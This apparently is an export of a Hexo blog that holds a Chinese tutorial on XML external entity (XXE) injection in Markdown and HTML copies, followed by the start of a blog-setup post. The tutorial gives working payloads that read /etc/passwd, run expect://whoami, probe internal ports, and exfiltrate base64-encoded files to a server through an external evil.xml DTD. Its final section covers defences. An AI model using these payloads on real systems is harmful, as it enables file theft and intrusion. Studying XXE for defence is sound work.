\n\n![](S:\\hexo\\myblog\\source\\_posts\\XXE\\QQ截图20190301133421.png)\n\n![](XXE\\QQ截图20190301133122.png)\n\n**无回显的情况：**\n\n`%file;`会调用php插件对要读取的文件内容进行Base64编码。\n\n`%dtd;`会请求我们编写好的`evil.xml`文件，会被`evil.xml`文件内容替换。\n\n`%payload;`被`<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>`替换。\n\n`%send;`会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看`http`的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。\n\nPayload:\n\n```\n<!DOCTYPE note [ \n  <!ELEMENT note ANY >\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/S:/test.txt\">\n  <!ENTITY % dtd SYSTEM \"http://localhost/evil.xml\">\n  %dtd; %payload; %send;  ]>\n```\n\n`evil.xml`文件内容：内部`send`的`%`要用实体：`&#x25;`\n\n```\n<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>\"> \n```\n\n`http`访问日志：（到配置文件`http.conf`里找到`CustomLog \"logs/access.log\" common`并删除掉`#`号注释）\n\n![](XXE\\QQ截图20190301152037.png)\n\n**PS:**之所以要引入文件`evil.xml`原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。\n\nBase64解码：\n\n![](XXE\\QQ截图20190301152528.png)\n\n**2.命令执行：**\n\n安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。\n\n[expect](http://php.net/manual/zh/wrappers.expect.php)封装协议默认未开启。\n\nPayload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"expect://whoami\"> ]><x>&xxe;</x>`\n\n**3.内网端口探测：**\n\nPayload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"http://localhost:81\"> ]><x>%26xxe;</x>`\n\n## 0x04 漏洞防御\n\n- 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。\n- 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。\n- 在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。\n- 使用开发语言提供的禁用外部实体的方法。\n\n**参考链接：**\n\nhttps://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md\n\nhttps://www.cnblogs.com/backlion/p/9302528.html\n\nhttps://www.jianshu.com/p/77f2181587a4","slug":"XXE","published":1,"updated":"2019-03-01T08:40:50.962Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg860003j8r0fyxtj77z","content":"<h2 id=\"0x00-必备XML基础知识\"><a href=\"#0x00-必备XML基础知识\" class=\"headerlink\" title=\"0x00 必备XML基础知识\"></a>0x00 必备XML基础知识</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>\n<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。</p>\n<a id=\"more\"></a>\n<p><img src=\"/2019/03/01/XXE/InkedQQ截图20190301091748_LI.jpg\" alt></p>\n<p>更多XML基础知识跳转<a href=\"https://sakuxa.com/2019/02/28/xml/\">这里</a>。</p>\n<h2 id=\"0x01-XXE漏洞概述\"><a href=\"#0x01-XXE漏洞概述\" class=\"headerlink\" title=\"0x01 XXE漏洞概述\"></a>0x01 XXE漏洞概述</h2><p>XXE -“xml external entity injection”即”xml外部实体注入漏洞”。</p>\n<p>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>\n<p>在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 </p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301093413.png\" alt></p>\n<p><strong>漏洞检测：</strong></p>\n<p>首先，检测XML是否会被解析。<code>&amp;xxe;</code>是否会被解析为”this is xxe”.(注意：GET请求时记得把<code>&amp;</code>进行URL编码)</p>\n<blockquote>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;this is xxe..&quot;&gt; ]&gt; &lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n</blockquote>\n<p>然后，检测服务器是否支持外部实体。执行Payload后查看<code>test.com</code>服务器的http访问日志，看是否存在<code>GET /xxe_test HTTP/1.0</code>的请求，若存在则证明支持外部实体。</p>\n<blockquote>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM  &quot;http://test.com/xxe_test&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n</blockquote>\n<h2 id=\"0x02-恶意引入外部实体\"><a href=\"#0x02-恶意引入外部实体\" class=\"headerlink\" title=\"0x02 恶意引入外部实体\"></a>0x02 恶意引入外部实体</h2><p><strong>情景一：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note any&gt;   </span><br><span class=\"line\"> </span><br><span class=\"line\">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;note&gt; &amp;xxe; &lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>情景二：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note any&gt;   </span><br><span class=\"line\"> </span><br><span class=\"line\">  &lt;!ENTITY % hack SYSTEM &quot;hack.dtd&quot; &gt;</span><br><span class=\"line\">  % hack  //会被hack.dtd的内容替换。</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;note&gt; &amp;xxe; &lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><code>hack.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p><strong>情景三：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note SYSTEM &quot;hack.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;note&gt; &amp;xxe; &lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><code>hack.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p><strong>外部引用实体时，不同的程序可以使用的协议不一样：</strong></p>\n<p><img src=\"/2019/03/01/XXE/15129735161149.png\" alt></p>\n<h2 id=\"0x03-XXE漏洞利用\"><a href=\"#0x03-XXE漏洞利用\" class=\"headerlink\" title=\"0x03 XXE漏洞利用\"></a>0x03 XXE漏洞利用</h2><p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。</p>\n<p>一般XXE利用分为两大场景：有回显和无回显。</p>\n<blockquote>\n<ul>\n<li>有回显的情况可以直接在页面中看到Payload的执行结果或现象。</li>\n<li>无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。</li>\n</ul>\n</blockquote>\n<p>基本漏洞源码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $xml=simplexml_load_string($_REQUEST[&apos;xml&apos;]);</span><br><span class=\"line\">    echo &quot;&lt;p&gt;$xml&lt;/p&gt;&quot;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>1.任意文件读取：</strong></p>\n<p><strong>有回显的情况：</strong></p>\n<p>Payload:<code>&lt;!DOCTYPE note [&lt;!ELEMENT note ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///S://aa.txt&quot;&gt;]&gt;&lt;note&gt;&amp;xxe;&lt;/note&gt;</code> </p>\n<p><img src=\"/2019/03/01/XXE/S:/hexo\\myblog\\source\\_posts\\XXE\\QQ截图20190301133421.png\" alt></p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301133122.png\" alt></p>\n<p><strong>无回显的情况：</strong></p>\n<p><code>%file;</code>会调用php插件对要读取的文件内容进行Base64编码。</p>\n<p><code>%dtd;</code>会请求我们编写好的<code>evil.xml</code>文件，会被<code>evil.xml</code>文件内容替换。</p>\n<p><code>%payload;</code>被<code>&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;</code>替换。</p>\n<p><code>%send;</code>会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看<code>http</code>的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。</p>\n<p>Payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE note [ </span><br><span class=\"line\">  &lt;!ELEMENT note ANY &gt;</span><br><span class=\"line\">  &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/S:/test.txt&quot;&gt;</span><br><span class=\"line\">  &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class=\"line\">  %dtd; %payload; %send;  ]&gt;</span><br></pre></td></tr></table></figure>\n<p><code>evil.xml</code>文件内容：内部<code>send</code>的<code>%</code>要用实体：<code>&amp;#x25;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost/?content=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><code>http</code>访问日志：（到配置文件<code>http.conf</code>里找到<code>CustomLog &quot;logs/access.log&quot; common</code>并删除掉<code>#</code>号注释）</p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301152037.png\" alt></p>\n<p><strong>PS:</strong>之所以要引入文件<code>evil.xml</code>原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>\n<p>Base64解码：</p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301152528.png\" alt></p>\n<p><strong>2.命令执行：</strong></p>\n<p>安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。</p>\n<p><a href=\"http://php.net/manual/zh/wrappers.expect.php\" target=\"_blank\" rel=\"noopener\">expect</a>封装协议默认未开启。</p>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://whoami&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n<p><strong>3.内网端口探测：</strong></p>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://localhost:81&quot;&gt; ]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;</code></p>\n<h2 id=\"0x04-漏洞防御\"><a href=\"#0x04-漏洞防御\" class=\"headerlink\" title=\"0x04 漏洞防御\"></a>0x04 漏洞防御</h2><ul>\n<li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。</li>\n<li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。</li>\n<li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</li>\n<li>使用开发语言提供的禁用外部实体的方法。</li>\n</ul>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md\" target=\"_blank\" rel=\"noopener\">https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md</a></p>\n<p><a href=\"https://www.cnblogs.com/backlion/p/9302528.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/backlion/p/9302528.html</a></p>\n<p><a href=\"https://www.jianshu.com/p/77f2181587a4\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/77f2181587a4</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-必备XML基础知识\"><a href=\"#0x00-必备XML基础知识\" class=\"headerlink\" title=\"0x00 必备XML基础知识\"></a>0x00 必备XML基础知识</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>\n<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。</p>","more":"<p><img src=\"/2019/03/01/XXE/InkedQQ截图20190301091748_LI.jpg\" alt></p>\n<p>更多XML基础知识跳转<a href=\"https://sakuxa.com/2019/02/28/xml/\">这里</a>。</p>\n<h2 id=\"0x01-XXE漏洞概述\"><a href=\"#0x01-XXE漏洞概述\" class=\"headerlink\" title=\"0x01 XXE漏洞概述\"></a>0x01 XXE漏洞概述</h2><p>XXE -“xml external entity injection”即”xml外部实体注入漏洞”。</p>\n<p>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>\n<p>在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 </p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301093413.png\" alt></p>\n<p><strong>漏洞检测：</strong></p>\n<p>首先，检测XML是否会被解析。<code>&amp;xxe;</code>是否会被解析为”this is xxe”.(注意：GET请求时记得把<code>&amp;</code>进行URL编码)</p>\n<blockquote>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;this is xxe..&quot;&gt; ]&gt; &lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n</blockquote>\n<p>然后，检测服务器是否支持外部实体。执行Payload后查看<code>test.com</code>服务器的http访问日志，看是否存在<code>GET /xxe_test HTTP/1.0</code>的请求，若存在则证明支持外部实体。</p>\n<blockquote>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM  &quot;http://test.com/xxe_test&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n</blockquote>\n<h2 id=\"0x02-恶意引入外部实体\"><a href=\"#0x02-恶意引入外部实体\" class=\"headerlink\" title=\"0x02 恶意引入外部实体\"></a>0x02 恶意引入外部实体</h2><p><strong>情景一：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note any&gt;   </span><br><span class=\"line\"> </span><br><span class=\"line\">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;note&gt; &amp;xxe; &lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>情景二：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note any&gt;   </span><br><span class=\"line\"> </span><br><span class=\"line\">  &lt;!ENTITY % hack SYSTEM &quot;hack.dtd&quot; &gt;</span><br><span class=\"line\">  % hack  //会被hack.dtd的内容替换。</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;note&gt; &amp;xxe; &lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><code>hack.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p><strong>情景三：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note SYSTEM &quot;hack.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;note&gt; &amp;xxe; &lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><code>hack.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p><strong>外部引用实体时，不同的程序可以使用的协议不一样：</strong></p>\n<p><img src=\"/2019/03/01/XXE/15129735161149.png\" alt></p>\n<h2 id=\"0x03-XXE漏洞利用\"><a href=\"#0x03-XXE漏洞利用\" class=\"headerlink\" title=\"0x03 XXE漏洞利用\"></a>0x03 XXE漏洞利用</h2><p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。</p>\n<p>一般XXE利用分为两大场景：有回显和无回显。</p>\n<blockquote>\n<ul>\n<li>有回显的情况可以直接在页面中看到Payload的执行结果或现象。</li>\n<li>无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。</li>\n</ul>\n</blockquote>\n<p>基本漏洞源码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $xml=simplexml_load_string($_REQUEST[&apos;xml&apos;]);</span><br><span class=\"line\">    echo &quot;&lt;p&gt;$xml&lt;/p&gt;&quot;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>1.任意文件读取：</strong></p>\n<p><strong>有回显的情况：</strong></p>\n<p>Payload:<code>&lt;!DOCTYPE note [&lt;!ELEMENT note ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///S://aa.txt&quot;&gt;]&gt;&lt;note&gt;&amp;xxe;&lt;/note&gt;</code> </p>\n<p><img src=\"/2019/03/01/XXE/S:/hexo\\myblog\\source\\_posts\\XXE\\QQ截图20190301133421.png\" alt></p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301133122.png\" alt></p>\n<p><strong>无回显的情况：</strong></p>\n<p><code>%file;</code>会调用php插件对要读取的文件内容进行Base64编码。</p>\n<p><code>%dtd;</code>会请求我们编写好的<code>evil.xml</code>文件，会被<code>evil.xml</code>文件内容替换。</p>\n<p><code>%payload;</code>被<code>&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;</code>替换。</p>\n<p><code>%send;</code>会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看<code>http</code>的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。</p>\n<p>Payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE note [ </span><br><span class=\"line\">  &lt;!ELEMENT note ANY &gt;</span><br><span class=\"line\">  &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/S:/test.txt&quot;&gt;</span><br><span class=\"line\">  &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class=\"line\">  %dtd; %payload; %send;  ]&gt;</span><br></pre></td></tr></table></figure>\n<p><code>evil.xml</code>文件内容：内部<code>send</code>的<code>%</code>要用实体：<code>&amp;#x25;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost/?content=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><code>http</code>访问日志：（到配置文件<code>http.conf</code>里找到<code>CustomLog &quot;logs/access.log&quot; common</code>并删除掉<code>#</code>号注释）</p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301152037.png\" alt></p>\n<p><strong>PS:</strong>之所以要引入文件<code>evil.xml</code>原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>\n<p>Base64解码：</p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301152528.png\" alt></p>\n<p><strong>2.命令执行：</strong></p>\n<p>安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。</p>\n<p><a href=\"http://php.net/manual/zh/wrappers.expect.php\" target=\"_blank\" rel=\"noopener\">expect</a>封装协议默认未开启。</p>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://whoami&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n<p><strong>3.内网端口探测：</strong></p>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://localhost:81&quot;&gt; ]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;</code></p>\n<h2 id=\"0x04-漏洞防御\"><a href=\"#0x04-漏洞防御\" class=\"headerlink\" title=\"0x04 漏洞防御\"></a>0x04 漏洞防御</h2><ul>\n<li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。</li>\n<li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。</li>\n<li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</li>\n<li>使用开发语言提供的禁用外部实体的方法。</li>\n</ul>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md\" target=\"_blank\" rel=\"noopener\">https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md</a></p>\n<p><a href=\"https://www.cnblogs.com/backlion/p/9302528.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/backlion/p/9302528.html</a></p>\n<p><a href=\"https://www.jianshu.com/p/77f2181587a4\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/77f2181587a4</a></p>"},{"title":"博客搭建记录 Node.js + Hexo + Yelee + Git Pages","date":"2019-02-21T06:32:04.000Z","_content":"\n## 0x00 概述\n\n本博客采用Node.js + Hexo + Yelee + Git Pages方案。\n\n博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。\n\n博客搭建可分为四部分：\n\n- Hexo安装及使用\n- Hexo配置\n- Hexo联合Git Pages部署\n- 绑定个人域名（可选）\n\n<!-- more -->\n\n## 0x01 Hexo安装\n\n> Hexo 是一个快速、简洁且高效的博客框架。\n>\n> Hexo 使用 [Markdown](http://daringfireball.net/projects/markdown/)（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n**1.安装Node.js与Git**\n\n*Node*.*js* 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。\n\nGit用于进行版本控制。\n\n使用命令`node -v`及其`git version`验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。\n\n**2.安装Hexo**\n\n安装命令：\n\n`npm install -g hexo-cli`\n\n> npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。\n\n初始化博客：\n\n`hexo init myblog`\t\t //myblog是可以任意取的。\n\n安装依赖：\n\n`cd myblog`\t\t //进入这个myblog文件夹\n`npm install`\t\t//npm会根据目录下的package.json文件安装所需要的依赖。\n\n完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)：\n\n> - public                            //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。\n> - scaffolds                      //该文件夹下存放文章、页面等的模板。\n> - source\\posts              //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。\n> - themes                     //存放网页主题的目录。\n> - _config.yml             //Hexo配置文件。\n\n运行博客：\n\n`hexo   g` \t\t     //等价于`hexo generate`，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。\n\n`hexo  s`\t\t   //等价于`hexo server`，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。\n\n## 0x02 Hexo配置\n\n**修改主题**\n\nHexo拥有众多主题，本博客采用[Yelee](https://github.com/MOxFIVE/hexo-theme-yelee)。\n\n首先到Github上下载或使用`git clone`将主题下载并放到themes目录下。\n\n然后修改hexo配置文件_config.yml，找到`theme:landscape`修改为`theme:yelee`。\n\n关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。\n\n## 0x03 Hexo联合Git Pages部署\n\n**1.关于Git Pages**:\n\nGitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。\n\n**2.Git Pages配置**\n\n首先，注册并拥有Github账号。\n\n然后，创建一个新的代码仓库。并使用`xxx.github.io`作为仓库名字。\n\n![](build-blog\\br.jpg)\n\n然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改`deploy`:\n\n```\ndeploy:\n  type: git\n  repo: https://github.com/sh4douu/sh4douu.github.io.git  #这里是上一步创建的仓库连接。\n```\n\n**3.部署hexo到git pages：**\n\n执行部署命令前，先安装用于部署的插件：`npm install hexo-deployer-git --save`\n\n执行部署：`hexo   d`   //等同于hexo deploy\n\n> 所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。\n>\n> 然后通过Git 